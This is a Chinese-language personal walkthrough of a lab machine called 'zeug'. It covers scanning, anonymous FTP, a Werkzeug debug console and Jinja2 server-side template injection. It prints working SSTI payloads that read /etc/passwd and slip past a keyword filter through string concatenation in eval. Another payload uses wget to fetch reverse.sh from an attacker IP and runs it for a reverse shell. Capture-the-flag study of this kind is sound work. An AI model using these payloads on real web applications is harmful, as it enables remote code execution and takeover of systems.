---
title: zeug_hard
tags:
  - sec
date: 2024-02-09T19:30:21
lastmod: 2025-09-29T20:52:15
toc: "true"
---
netdiscover
## 主机发现
启动前
![HMM_zeug_image_1|550](https://img.l1uyun.one/HMM_zeug_image_1.png)
启动后, 以后就先导入 VirtualBox 然后导出, 再导入 VMware 算了
![HMM_zeug_image_2](https://img.l1uyun.one/HMM_zeug_image_2.png)
靶机 ip 192.168.10.4
## 端口扫描
![HMM_zeug_image_3](https://img.l1uyun.one/HMM_zeug_image_3.png)

![HMM_zeug_image_4|700](https://img.l1uyun.one/HMM_zeug_image_4.png)

![HMM_zeug_image_5|550](https://img.l1uyun.one/HMM_zeug_image_5.png)
![HMM_zeug_image_6|600](https://img.l1uyun.one/HMM_zeug_image_6.png)
![HMM_zeug_image_7](https://img.l1uyun.one/HMM_zeug_image_7.png)
## FTP 匿名登录
![HMM_zeug_image_8](https://img.l1uyun.one/HMM_zeug_image_8.png)

```bash
~/workspace cat README.txt
Hi, Cosette, don't forget to disable the debug mode in the web application, we don't want security breaches.
```
提示有一个 debug 页面可以利用
## web 侦查
进去之后是一个上传文件的页面, 先去搜了一下 cve, 因为不确定 cms 名称啥的, 
后面搜到了 console 目录, 然后访问了 console 目录, 才确定这是 Werkzeug
![HMM_zeug_image_9|900](https://img.l1uyun.one/HMM_zeug_image_9.png)
这里的 cve 用不了
想着来目录扫描一下
![HMM_zeug_image_10|550](https://img.l1uyun.one/HMM_zeug_image_10.png)
##  控制台页面
最后只有主页的文件上传和一个 console 页面能用, console 页面需要一个 PIN
https://www.daehee.com/werkzeug-console-pin-exploit/
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
查到了这两篇文章, 提示需要一些属性, 然后能够计算出 PIN 值
![HMM_zeug_image_11](https://img.l1uyun.one/HMM_zeug_image_11.png)
利用后面的 SSTI 获取到了这些参数, 但是最终还是利用失败了
最终是利用失败了
## 服务器端模板注入
Server Side Template Injection
还是得看主页的渲染, 之前随便上传了个 html 文件 (前端验证, 无所谓的), 确定了是 ssti 注入
![HMM_zeug_image_12](https://img.l1uyun.one/HMM_zeug_image_12.png)
这里能够执行出结果, 说明有渲染. 执行的过程, 存在 ssti
![HMM_zeug_image_13|332](https://img.l1uyun.one/HMM_zeug_image_13.png)
`过滤了 import, os, attr, script. app, mro,[,], init 的 ssti 注入`
![HMM_zeug_image_14](https://img.l1uyun.one/HMM_zeug_image_14.png)
在 payloadallthing 里面找[能用的 payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)
2024-02-10-00:55:01
明天晚上再看看
```bash
# 我找到的是这个,能够读取文件,但是没用....
{{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}


wp的payload,神奇的linsum

{{lipsum.__globals__.__builtins__.open("/etc/passwd").read()}}

# 好吧,我是傻逼,使用eval这个方法可以直接字符串拼接
 
{{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"ls -lh /\").read()")}}

```
![HMM_zeug_image_15](https://img.l1uyun.one/HMM_zeug_image_15.png)


```bash
cosette
flask.app
Flask
/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py 


# mac地址
00:0c:29:32:d5:b0
十进制
>>> print(0x000c2932d5b0)
52230804912

48329e233f524ec291cce7479927890b
```
![HMM_zeug_image_16|700](https://img.l1uyun.one/HMM_zeug_image_16.png)
![HMM_zeug_image_17|650](https://img.l1uyun.one/HMM_zeug_image_17.png)
![HMM_zeug_image_18](https://img.l1uyun.one/HMM_zeug_image_18.png)
![HMM_zeug_image_19|450](https://img.l1uyun.one/HMM_zeug_image_19.png)
但是失败了, 换成 md5 也不行, 搞不明白

去看 wp了

```bash
{{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"wget http://192.168.10.11:8000/reverse.sh -O /tmp/reverse.sh\").read()")}}


{{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"/tmp/reverse.sh\").read()")}}
```
![HMM_zeug_image_20](https://img.l1uyun.one/HMM_zeug_image_20.png)

![HMM_zeug_image_21](https://img.l1uyun.one/HMM_zeug_image_21.png)

![HMM_zeug_image_22](https://img.l1uyun.one/HMM_zeug_image_22.png)
![HMM_zeug_image_23](https://img.l1uyun.one/HMM_zeug_image_23.png)
![HMM_zeug_image_24](https://img.l1uyun.one/HMM_zeug_image_24.png)

![HMM_zeug_image_25](https://img.l1uyun.one/HMM_zeug_image_25.png)

![HMM_zeug_image_26](https://img.l1uyun.one/HMM_zeug_image_26.png)

```bash
strings  /usr/bin/zeug
```
![HMM_zeug_image_27](https://img.l1uyun.one/HMM_zeug_image_27.png)

![HMM_zeug_image_28](https://img.l1uyun.one/HMM_zeug_image_28.png)
## 提权
这块涉及计算机底层的东西, 我不懂, 吐了, 先放着

## 学习 wp
![HMM_zeug_image_29](https://img.l1uyun.one/HMM_zeug_image_29.png)
![HMM_zeug_image_30](https://img.l1uyun.one/HMM_zeug_image_30.png)
![HMM_zeug_image_31](https://img.l1uyun.one/HMM_zeug_image_31.png)

![HMM_zeug_image_32](https://img.l1uyun.one/HMM_zeug_image_32.png)
![HMM_zeug_image_33](https://img.l1uyun.one/HMM_zeug_image_33.png)

![HMM_zeug_image_34](https://img.l1uyun.one/HMM_zeug_image_34.png)
![HMM_zeug_image_35](https://img.l1uyun.one/HMM_zeug_image_35.png)



]]